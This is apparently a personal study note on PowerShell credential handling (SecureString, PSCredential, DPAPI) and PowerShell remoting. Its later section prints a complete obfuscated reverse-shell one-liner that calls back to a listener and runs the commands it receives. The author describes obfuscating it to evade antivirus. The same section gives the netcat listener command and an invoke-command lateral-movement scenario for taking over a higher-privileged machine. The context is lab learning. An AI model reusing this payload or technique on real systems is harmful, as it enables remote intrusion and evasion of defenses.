## Credentials 
powershell have a wonderfull solution to keep your credentials safe and sound 
 we can create an object with `get-credential` command and store them in a variable 
![[Pasted image 20240725155119.png]]
as you can see the password is stored in **system.security.securestring**
securestring is stored encrypted in memory and it can only be decrypted with data protection api in windows **"dpapi"**
without dpapi the password which are  stored in memory will be in plaintext and can be seen. if memory dump happen or with low memory space some pages are transferred to hard disk it can also be found there 
we can utilize secure string type within powershell to safe gaurd our strings by using `get-credential` 

it is usefull when we want credentials to store on a script without putting them as plain text we can use pscredential class of powershell to do that this class is used by get-credential which prompts the user to input username and password send those to pscredential class 
there are many other commands which usses PScredential to convert those as securestring 

in powershell there are parametertype which indicates that which type of parameter are supported by that command like interger boolean string array and securestring etc
so securestring is also a type of paramter which so many commands uses means we can pass the credentials with storing username and password in securestring to that command for example 
```powershell
$credential = Get-Credential 
Invoke-Command -ComputerName "Server01" -Credential $credential -ScriptBlock { Get-Process }
```
to get all the commands which supports this parameter type 
```powershell
get-command -parametertype PScredential | sort -property noun
```
remember pscredential is a class which all these commands use for securestring

not only we have support in commands we can also secure any string 
```powershell
$key = read-host -assecurestring "enter your private key "
```
then this will promt you for a key and encrypt it . the same thing can be done with any string 
we are just taking input from user by read-host 

to decrypt the encrypted text stored as password 
```powershell
$cred.getnetworkcredential().password
```
this will convert the securestring back to plaintext but it works with `$creds=get-credential`
it does not work with read-host command because they both handle securestring differently 
`Get-Credential` returns a `PSCredential` object that includes both the username and password, while `Read-Host -AsSecureString` returns just a `SecureString`. When you try to convert the `SecureString` to plain text using `GetNetworkCredential()`, it works for the `PSCredential` object but not for the `SecureString` directly from `Read-Host -AsSecureString`.

##### decrypting securestring from read-host -assecurestring
```powershell
# Prompt the user to enter a password securely
$key = Read-Host -AsSecureString "Enter your password"

# Convert SecureString to plain text
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($key)
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($BSTR)

# Output the plain text password (for demonstration purposes only)
Write-Output "Your password is: $plainTextPassword"

```

### creating secure string from clear text passwords 
we can also create secure string from passwords which are in plain text in a script or any other token or credential . but there is a good chance that password or creds can be seen in history file if you are using psreadline older versions 

```powershell
$username="alihanfi"
$pass=convertto-securestring "alihanfi.." -asplaintext -force
$creds=new-object -typename system.management.automation.pscredential -argumentlist $username,$pass
```
this will create securestring of password and username  . and notice that we are converting password to secure string because the pscredential is a class in which the constructor get two parameter one is string type and other one is securestring type . when we create an object of that class we have to pass those variable to get an credential 0bject with username and password . then we are creating a .net framework object and the type is pscredential then args are username and password 
let me tell you that when we typecast we also have to define the input type in our case it is a string so we used -asplaintext 

we can varify the dpapi is encypting the text by typecasting the encrypted securestring back to string 
```powershell
$user=alihanfi
$securestring=convertto-sercurestring $user -asplaintext -force 
$encrypted=convertfrom-sercurestring -securestring $securestring 
$encrypted  
```
![[Pasted image 20240726210620.png]]
#### Storing the securestring to a File 
it is encrypted with dpapi so what if someone stole this encrypted password . well that encrypted password only runs on current session or current user who created that securestring so it is safe to put securestring in file system  
```powershell
$user="alihanfi"
$passs=convertto-securestring "alihanfi.." -asplaintext -force 
$creds=new-object -typename System.management.automation.pscredential -argumentlist $user , $passs
$creds.passs | convertfrom-securestring 
$creds.passs | convertfrom-securestring | out-file encrypted.txt

#converting back to securestring to use in scripts 

$securestring = get-content .\encrypted.txt | convertto-securestring 
```
so it can be used in scripts and if you wanna store your password in file system or if you wanna do use creating an authentication object and use it every where like remotely logging into system 

## Powershell Remoting 
- powershell remoting can be used to do system admin task 
- powershell remoting uses winRM protocol on 5985 (over HTTP)and 5986(over HTTPS) to connect to systems remotly . 
- the http does not have its own security but the data in transit is encrypted . powershell remoting  is bydefault enable  on windows server but not on clients 
- it works cross platform if you installed powershell core onlinux or mac and enabling powershell remoting over ssh 
#### Enabling powershell remoting on windows clients 
```powershell
#you can get a default config of winrm on machine 
winrm quickconfig

#for enabling ps remoting 
enable-psremoting 
```
this will turn on the listner for winrm and if you configure quickconfig it will not configure if the network category is set to public 
```powershell
set-netconnectionprofile -networkcategory Private
```

still if the computer you are access remotly if it is not on local domain or with no-premises synchronization . maybe they both are on same local network or joined to microsoft Entra ID . we have to add that machine to trustedhosts
if you encounter these errors
```powershell
- > Enter-PSSession : Connecting to remote server CLIENT01 failed with the following error message : The WinRM client cannot process the request. If the authentication scheme is different from Kerberos, or if the client computer is not joined to a domain, then HTTPS transport must be used or the destination machine must be added to the TrustedHosts configuration setting. Use winrm.cmd to configure TrustedHosts. Note that computers in the TrustedHosts list might not be authenticated. You can get more information about that by running the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.
    
- > Enter-PSSession : Connecting to remote server CLIENT01 failed with the following error message : WinRM cannot process the request. The following error with errorcode 0x8009030e occurred while using Negotiate authentication: A specified logon session does not exist. It may already have been terminated.  
> Possible causes are:  
> -The user name or password specified are invalid.  
> -Kerberos is used when no authentication method and no user name are specified.  
> -Kerberos accepts domain user names, but not local user names.  
> -The Service Principal Name (SPN) for the remote computer name and port does not exist.  
> -The client and remote computers are in different domains and there is no trust between the two domains.  
 > After checking for the above issues, try the following:  
> -Check the Event Viewer for events related to authentication.  
> -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or use HTTPS transport.  
> Note that computers in the TrustedHosts list might not be authenticated.  
> -For more information about WinRM configuration, run the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.
```

the issue occurs because of one of the following reasons 
- WinRM considers the Microsoft Entra-only joined machines as workgroup machines. Therefore, implicit credentials can't be used.
- The WinRM default Service Principal Name (SPN=> [[TREASURE/Powershell for Infosec/Doubts#**2024-07-27**|Doubts]]) prefix HTTP prevents Microsoft Entra authentication.

### Implicit credentials can't be used

To resolve this issue, set the `TrustedHosts` value as follows:

Expand table

| Value           | Description                                                                         |
| --------------- | ----------------------------------------------------------------------------------- |
| `*`             | This value allows reusing the implicit credentials for all target machines.         |
| `*.contoso.com` | This value restricts the usage of credentials to the machines of a specific domain. |

For example, you can use one of the following ways to set the `TrustedHosts` value to `*.contoso.com`:

- The PowerShell cmdlet:
    
    PowerShellCopy
    
    ```powershell
    set-item WSMan:\localhost\Client\TrustedHosts "*.contoso.com"
    ```
    
- The command prompt:
    
    ConsoleCopy
    
    ```powershell
    winrm s winrm/config/client @{TrustedHosts="*.contoso.com"}
    ```
- you can add all the computer onthe local hosts (very insecure way ) but avoids the hassle to add computers all the time if you want to address computer by ip you have to add the ip to trusted hosts 
```powershell
	Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"
```
by using a wildcard you can bypass that check everytime you wanna connect to a computer 
#### Why TrustedHosts is Required
###### Lack of a Trusted Authentication Mechanism:
In a domain environment, Kerberos authentication is used, which provides a secure and trusted way to authenticate users across the network.
In a non-domain (workgroup) environment, Kerberos is not available. As a result, WinRM cannot use the same secure authentication mechanisms and relies on NTLM or basic authentication, which are less secure.

###### Trust Issues:
When connecting to a remote computer, especially over a network, there needs to be a level of trust established between the client and the server.
By default, WinRM does not trust any remote computers in a workgroup environment, and adding a computer to the TrustedHosts list explicitly tells WinRM to trust that computer.

##### Passing credentials to connect to a hosts  
first follow the procedure to add the hosts on trusted network and so on above .....
```powershell
enter-pssession -computername THEPUNISHER -credential $creds
```
this gives a prompt to enter username and password if you didnt created a securestring for your credential 

you can pass the username and passsword if you want to log in as another user 

#### Other commands which have remoting capabilities 
besided psremoting there are other commands which have the remoting capabilities 
builtin so even if powershell remoting isnt enable we can still execute powershell commands 
there are so many commands having `-computername` as a parameter in them . 

![[Pasted image 20240728153054.png]]
and there are other commands too which are not in the list 
so psremoting is not enabled so do winrm so they work on rpc protocol or another protocols depending what commands are used and in which context like if there is a file share SMB will be used or some connecting from SSH so context matters here 
one of them are WMI windows management instrumentation  **but they cannot do much in campare to powershell remoting**  
they are purpose build so they might give you better performance bcz they are only made for that pupose only 

##### There is  a difference in session and just executing commands on remote computer 
```powershell
invoke-command -computername THEPUNISHER -Credential $creds -Command {$x = get-process}
```
you cannot invoke that variable bcz we dont have  session where that variable reside 
we can do this 
```powershell
invoke-command -computername THEPUNISHER -Credential $creds -Command {$x = get-process; $x }
```
this will print the variable 

so this is the difference in session and just executing commands on remote computer 
we cannot retain our variable and its like we dont have full shell in terms of linux if you say 

we can use this as executing a script like reverse-shell script on target computer 
i found a reverse shell script on internet and obfuscated it with [[Modules#[Powershell commands Obfuscation](https //github.com/clr2of8/Invoke-Obfuscation)]]  using **ast** and it evaded windows antivirus and script run
```powershell
invoke-command -computername THEPUNISHER -credential $creds -filepath .\rs.ps1
```
notice that we executed a powershell script with invoke command using winrm protocol becz it uses winrm to remotely execute commands when i tested it by stopping winrm service on target computer it does not connect so it means it is using winrm 
if you want to execute a script which is on target computer you can use 
```powershell
invoke-command -computername THEPUNISHER -credential $creds -command {powershell -file <file path >}
```
you can also execute a scriptblock 
```powershell
invoke-command -computername THEPUNISHER -credential $creds -command {
<your script block to be executed >
}
```

##### Discussing an attack 
now back to the script 
```powershell
 Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient((('19'+("{1}{0}"-f '68','2.1'))+('.1'+'.')+'5'),80));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex ". { $data } 2>&1" | Out-String ); Set-Variable -Name sendback2 -Value ($sendback + ('P'+'S ') + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
its  a reverse shell obfuscated with invoke-obfuscation to evade antivirus 
i ran it with another vm to target vm to connect that target vm to a linux machine on local hosts 
first on 
- linux machine
```
nv -nvlp 80
```
choose any port 

- windows VM 
```
invoke-command -computername THEPUNISHER -CREDENTIAL $creds -filepath .\rs.ps1
```
you can use ip intead of hostname 

- target windows VM 
```
netstat 
OR 
get-nettcpconnection
```
to find out there is a connection to a linux machine on the local network . You will not see any changes but its like a post exploitation technique to connect  back to the linux machine 

**an actual attack**
lets say we have computer A and computer B  . computer B can remotly connect to com A . and we somehow exploited and get shell on computer B now we want to compromise com A because it have higher priviledge on active directory we found out that with [[Popular Powershell Attack Tools#Bloodhound]] tool . so we ran a reverse shell obfuscated script on com A with invoke-command . by com B bcz we have shell baby !!!!!!!
```
invoke-command -computername "com A " -credential $creds -filepath .\rs.ps1
```
and the start the listner on attackers machine  
```
nc -nvlp 80
```
and boom you have reverseshell on that 
if you want to connect to another port you have to slightly modify the reverseshell 
```
$reverse-shell=cat rs.ps1
$new-rs=$reverse-shell -replace "80" , "443"
set-contetn -path "newrs.ps1" -value $new-rs
```
this will edit the reverseshell . but you also have to manually check if that reverseshell is not modified other than what we want to change . or use compare-object to compare two files 

so up until now you get a hold of what the use of just executing a command over taking a session . now lets talk more about sessions 

##### Sessions 
###### creating sessions 
```
 $newsession=New-PSSession -computername THEPUNISHER -Credential $creds
```
```
invoke-command -Session $newsession -command {$x=get-process} 
```
```
 invoke-command -Session $newsession -command {$x} 
```
now we can retain the variable and functions if we define bcz we have session on instead of just executing commands 

you can create more that 1 sessoin and specify more that one computer name or ip of to create multiple session and execute 1 commands to multiple computer over a network so this makes it very usefull when we want a single comands or a script to run on multiple computers just create session of those computer and run that single command to exec remotly on all the selected computers . we can even use a file to address all the computer in `-computername` parameter if not we can just use a variable to pass that info 

